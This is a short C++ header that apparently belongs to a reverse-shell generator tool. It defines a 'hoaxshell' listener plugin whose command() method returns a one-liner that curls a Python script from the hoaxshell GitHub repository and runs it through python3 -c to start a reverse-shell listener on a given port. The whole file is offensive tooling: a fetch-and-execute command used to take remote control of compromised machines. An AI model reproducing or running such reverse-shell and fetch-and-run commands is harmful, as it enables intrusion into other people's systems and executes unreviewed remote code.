#pragma once
#include "InterfaceListener.h"

class Hoaxshell : public IListener {
public:
  std::string name() const override { return "hoaxshell"; }
  std::string command(const Options &o) const override {
    return "python3 -c \"$(curl -s "
           "https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/"
           "revshells/hoaxshell-listener.py)\" -t cmd-curl -p " +
           std::to_string(o.port);
  }
};
